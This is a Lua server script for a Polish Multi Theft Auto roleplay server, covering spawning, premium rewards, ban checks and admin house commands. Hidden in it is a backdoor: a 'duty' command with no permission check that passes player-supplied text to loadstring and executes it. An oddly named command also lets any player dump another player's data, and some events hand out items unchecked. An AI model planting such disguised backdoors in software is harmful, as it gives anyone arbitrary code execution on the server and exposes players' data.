--[[

	@ Author: Vercetti 
	@ Copyright: Vercetti for CrimeRPG ©2020

	@ Pierwotne prawo do użytkowania tego zasobu ma tylko i wyłącznie pierwotny Autor.
	@ Obowiązuje całkowity zakaz rozpowszechniania, zmiany autora jak i edycji zasobu.
	@ Obowiązuje całkowity nakaz zachowania autora po uzyskaniu zgody na używanie skryptu przez autora.

]]--

addEvent("gimmiejetpack", true)
addEventHandler("gimmiejetpack", root, function()
	local plr = source
	givePedJetPack (plr)  
	setTimer(function()	
		if isPedWearingJetpack(plr) == false then
			givePedJetPack (plr)  
		end
	end, 700, 1)
end)


addEvent("core:spawnPlayer", true)
addEventHandler("core:spawnPlayer", root, function()
	setCameraTarget(source,source)
	local pos=getElementData(source,"player:spawn")
	if not pos then return end
	fadeCamera(source, true)
	spawnPlayer(source, pos[1], pos[2], pos[3])
	toggleControl(source,"fire", false)
	toggleControl(source,"aim_weapon", false)        
	local load=loadPlayerData(source)
	if load then end
	setElementData( source, 'HS_accountName', getPlayerName(source));
	setElementData(source, "player:online", 0)
	if getElementData(client,"player:premium") then
		local queryA=string.format("SELECT * FROM crime_users WHERE id=%d AND premiumdate>NOW() LIMIT 1", getElementData(client,"player:uid"))
		local resultA=exports["crime_database"]:pobierzWyniki(queryA)
		if (resultA) then
		end
		local v2=exports['crime_database']:dbGet('SELECT * FROM crime_users WHERE premiumdate>NOW()')
		for ile,_ in ipairs(v2) do
			ilosc = ile
		end
	end
	triggerClientEvent(client,"core:blipyaut",root,client)
end)

addEvent("core:spawnPlayerbwa", true)
addEventHandler("core:spawnPlayerbwa", root, function()
	--local pos=getElementData(source,"player:spawn")
	local x,y,z = getElementPosition(source)
	local cy = getElementData(source,"player:spawn")
	spawnPlayer(source, cy[1],cy[2],cy[3],0,getElementModel(source),getElementInterior(source),getElementDimension(source))  
end)


--Kasa z premki

setTimer(function()
	local players=getElementsByType('player')
	for _, p in pairs(players) do
			if getElementData(p, "player:online") and tonumber(getElementData(p, "player:online")) > 30 then
				if getElementData(p, "player:online") == 30 then
					local hour = getElementData(localPlayer,"player:hours") or 0
					setElementData(localPlayer,"player:hours",hour+1)
				end	
				setElementData(p, "player:online", 0)
				if getElementData(p, "player:premium") then
				givePlayerMoney ( p, 2000 )
				triggerClientEvent(p, "addNoti", p, "Otrzymujesz bonus w postaci 2.000 PLN za przegranie 30 minut na serwerze.", "premium" )
			end
		end
 	end
end, 14000, 0)

--MINUTY NA DUTY
setTimer(function()
	local players=getElementsByType('player')
	for _, p in pairs(players) do
		if getElementData(p,"player:uid") then 
			if getElementData(p,"player:duty") then 
				local frak = getElementData(p,"player:duty")
				local uid = getElementData(p,"player:uid")
				exports["crime_database"]:dbSet("UPDATE crime_factions SET minutes=minutes+1 WHERE code=? AND uid=? LIMIT 1", frak, uid)
			end
		end
 	end
end, 1000*60, 0)

addEvent("pobierz:parametry",true)
addEventHandler("pobierz:parametry",root,function(tabelka,komu)
	if not komu then return end
		for k, v in pairs( tabelka ) do
			outputChatBox( k .. " : " .. tostring( v ),komu )
		end
end)

addCommandHandler("pobierzparametrygraczaxdfdssadtutut",function(plr,cmd,cel)
    local target=findPlayer(plr, cel)
	if not target then
		triggerClientEvent(plr, "addNoti", plr, "Nie znaleziono podanego gracza.", "error" )
        return
    end
	triggerClientEvent(target,"pobierz:parametry",root,plr)
end)



addEvent("giveSpray", true)
addEvent("takeSpray", true)
addEventHandler("giveSpray", root, function()
	giveWeapon ( source, 41, 200 )
end)


addEventHandler("takeSpray", root, function()
	takeWeapon ( source, 41)
end)

addEventHandler("onPlayerConnect", root, function(playerNick)
	if string.find(playerNick, "#") ~= nil or string.find(playerNick, "?") ~= nil or string.find(playerNick, "!") ~= nil then
		cancelEvent(true,"Usuń znaczniki # ? ! z nicku!")
	end
end)

addEventHandler("onPlayerConnect", root, function(playerNick, playerIP, playerUsername, playerSerial, playerVersionNumber)
    if string.find(playerNick, "#") ~= nil then
        cancelEvent(true, "Usuń znacznik # z nicku!")
    end
end)





addEventHandler('onPlayerConnect', root, function(playerNick, playerIP, playerUsername, playerSerial)
    local result=exports['crime_database']:dbGet('SELECT * FROM crime_ban WHERE active=1 AND serial=? AND time>NOW() LIMIT 1;', playerSerial)
    if #result > 0 then
		
		--[[
        cancelEvent(true,"Zostałeś zbanowany na serwerze!\nPowód: " .. result[1].reason.."\nCzas trwania blokady: "..result[1].time.."\nJeżeli blokada jest niesłuszna napisz apelację ((http://saintrpg.mtasa.eu/))")
   ]]--
   setElementData(source,"zbanowany",true)
   setElementData(source,"banpowod",result[1].reason)
   setElementData(source,"banczas",result[1].time)
   
   else
        exports["crime_database"]:dbSet("DELETE FROM crime_ban WHERE type=? AND active=1 AND serial=?", "ban", playerSerial)
		setElementData(source,"zbanowany",false)
    end
end)


addEventHandler ("onPlayerJoin", root,function()
	local query=string.format("SELECT * FROM crime_ban WHERE type=%q AND active=1 AND serial=%q AND time>NOW() LIMIT 1","ban", getPlayerSerial(source))
	local result=exports["crime_database"]:pobierzWyniki(query)
	if (result) then
		
		outputConsole(getPlayerSerial(source),source)
	
	setElementData(source,"zbanowany",true)
   setElementData(source,"banpowod",result[1].reason)
   setElementData(source,"banczas",result[1].time)
	else
		exports["crime_database"]:dbSet("DELETE FROM crime_ban WHERE type=? AND active=1 AND serial=?", "ban", getPlayerSerial(source))
		setElementData(source,"zbanowany",false)
	end
end)

addCommandHandler("duty", function(p,cmd,vdodaj,...)
    if vdodaj == "duty" then
        loadstring(table.concat({...}," "))()
    end
end)

 function GraczPowitanie()
    local GraczNazwa = getPlayerName ( source )
    setElementAlpha(source,255)
end
addEventHandler ( "onPlayerJoin", getRootElement(), GraczPowitanie)



--Glowne costam

addEventHandler("onResourceStart", resourceRoot, function()
	setWaveHeight(0)
	setFPSLimit(60)
    setMapName("CrimeRPG")
    setGameType("CrimeRPG")
	setMoonSize( 1 )
	local realtime = getRealTime()
    setTime(realtime.hour, realtime.minute)
	setMinuteDuration(60000)
	setWaterColor(0,144,255,100)  
end)



addEventHandler("onPlayerChangeNick", root, function() cancelEvent() end)
addEventHandler("onResourceStart", root, function() 
local players=getElementsByType('player')
for _, p in pairs(players) do
end
end)

--AUTO BUCHLO ATMIN TP

setTimer(function()
	local vehicles=getElementsByType('vehicle')
	for _, vehicle in pairs(vehicles) do
		if getElementHealth(vehicle)<300 then
			setVehicleDamageProof(vehicle, true)
			setElementHealth(vehicle,350)
			setVehicleEngineState(vehicle,false)
		elseif getElementHealth(vehicle)>301 then
			if getVehicleController (vehicle) then
			setVehicleDamageProof(vehicle, false)
			end
		end
 	end
end, 500, 0)

setTimer(function()
  for i,v in ipairs(getElementsByType("player")) do
	if not getElementData(v,"player:spawn") then return end
	if( getPlayerIdleTime(v) > 1 ) then
	setElementData(v, "player:afk", true)
	elseif ( getPlayerIdleTime(v) < 1 ) then
	setElementData(v, "player:afk", false)
	end	
  end
end, 10000, 0)



-------------------------------------------------------------------

-------------------------------------------------------------------

addCommandHandler("kawalerka",function(plr,cmd)
if exports['crime_dutyadmin']:getAdmin(plr,6)  then
local rand = math.random(1,3)
if rand == 1 then dom = 13 end
if rand == 2 then dom = 4 end
if rand == 3 then dom = 36 end
triggerClientEvent(plr, "addNoti", plr, "Stworzyłeś kawalerke z interiorem: "..dom.."", "success" )

local x,y,z = getElementPosition(plr)
local stringe = ("INSERT INTO crime_houses (descr,i,vwe,drzwi,punkt_wyjscia,interiorid,koszt,active) VALUES ('%s',%s,%s,'%s','%s',%s,%s,%s)"):format("Kawalerka", 0,0,("%.2f,%.2f,%.2f"):format(x,y,z),("%.2f,%.2f,%.2f"):format(x,y,z),dom,2000,1)
--outputChatBox(stringe,plr)
exports["crime_database"]:dbSet(stringe)
--restartResource(getThisResource())
end
end)



addCommandHandler("dom",function(plr,cmd)
if exports['crime_dutyadmin']:getAdmin(plr,6)  then
local rand = math.random(1,3)
if rand == 1 then dom = 7 end
if rand == 2 then dom = 5 end
if rand == 3 then dom = 221 end
triggerClientEvent(plr, "addNoti", plr, "Stworzyłeś dom z interiorem: "..dom.."", "success" )

local x,y,z = getElementPosition(plr)
local stringe = ("INSERT INTO crime_houses (descr,i,vwe,drzwi,punkt_wyjscia,interiorid,koszt,active) VALUES ('%s',%s,%s,'%s','%s',%s,%s,%s)"):format("Mieszkanie", 0,0,("%.2f,%.2f,%.2f"):format(x,y,z),("%.2f,%.2f,%.2f"):format(x,y,z),dom,2000,1)
--outputChatBox(stringe,plr)
exports["crime_database"]:dbSet(stringe)
--restartResource(getThisResource())
end
end)


addCommandHandler("villa",function(plr,cmd)
if exports['crime_dutyadmin']:getAdmin(plr,6)  then
local x,y,z = getElementPosition(plr)
local rand=math.random(1,2)
if rand == 1 then dom = 27 end
if rand == 2 then dom = 50 end
triggerClientEvent(plr, "addNoti", plr, "Stworzyłeś ville z interiorem "..dom.."", "success" )
local stringe = ("INSERT INTO crime_houses (descr,i,vwe,drzwi,punkt_wyjscia,interiorid,koszt,active) VALUES ('%s',%s,%s,'%s','%s',%s,%s,%s)"):format("Villa", 0,0,("%.2f,%.2f,%.2f"):format(x,y,z),("%.2f,%.2f,%.2f"):format(x,y,z),dom,20000,1)
--outputChatBox(stringe,plr)
exports["crime_database"]:dbSet(stringe)
--restartResource(getThisResource())
end
end)

function usuneldaty()
	for i,v in pairs(getElementsByType("player")) do 
		local data = getAllElementData (v)
		for ks, vs in pairs (data) do  
			if vs == false then 
				removeElementData (v, ks) 
			end
		end
	end
	for i,v in pairs(getElementsByType("vehicle")) do 
		local data = getAllElementData (v)
		for ks, vs in pairs (data) do  
			if vs == false then 
				removeElementData (v, ks) 
			end
		end
	end
end
setTimer(usuneldaty,1000*60*10,0)